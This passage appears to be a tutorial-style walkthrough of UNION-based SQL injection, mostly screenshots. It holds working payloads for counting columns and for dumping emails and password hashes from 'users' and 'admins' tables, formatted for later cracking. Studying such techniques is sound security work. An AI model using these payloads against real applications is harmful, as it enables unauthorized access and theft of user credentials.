
single quote displaying the database structure:

<img width="942" height="455" alt="image" src="https://github.com/user-attachments/assets/48d807f1-d6c5-415a-84ec-e4b18dbb2e13" />

Note that if we could not figure out how many columns were present based on the last error message we can use`' ORDER BY 1-- -` and change the # one by one to find where it breaks. Here is an example of it working as intended (so the db must have at least 7 columns based on this output):

<img width="955" height="339" alt="image" src="https://github.com/user-attachments/assets/ad2563a6-86aa-41a7-9b5e-8f29bf57f372" />

After testing we find that 8 columns is where it breaks:

<img width="942" height="455" alt="image" src="https://github.com/user-attachments/assets/aa81ddf5-27d0-48b7-a1cf-195285b86046" />

Next the goal is to find which columns we can actually use when exploiting it. For example, if we perform this test and columns 3-7 don't come back then we'd have to use 1-2. For this application the below test shows that we can use all 7.

<img width="939" height="366" alt="image" src="https://github.com/user-attachments/assets/70387ce7-5acf-4a22-874a-3c6f121e8188" />

We can now use this to extract the version and database schema:

<img width="954" height="393" alt="image" src="https://github.com/user-attachments/assets/75b79901-289d-4687-a2c1-a156fca88470" />

injection to grab single user/paswd hash `' UNION SELECT 1,email,password,4,5,6,7 FROM users LIMIT 0,1-- -` or can use `' UNION SELECT 1,email,password,4,5,6,7 FROM users -- -` to grab all in their own cells:


<img width="949" height="392" alt="image" src="https://github.com/user-attachments/assets/2d037646-87a8-4b77-a81e-c60241683d31" />

injection to grab all user/paswd hashes in one cell `' UNION SELECT 1,group_concat(email,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users-- -` (this is easiest to copy/paste to hash file for password cracking later.):

<img width="927" height="724" alt="image" src="https://github.com/user-attachments/assets/356475ac-a4e8-4363-bad0-790120799b1c" />

to grab the admins from the admin table we use `' UNION SELECT 1,group_concat(email,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM admins-- -`:

<img width="957" height="414" alt="image" src="https://github.com/user-attachments/assets/08144309-24e6-4a91-babc-f4cf18a06838" />
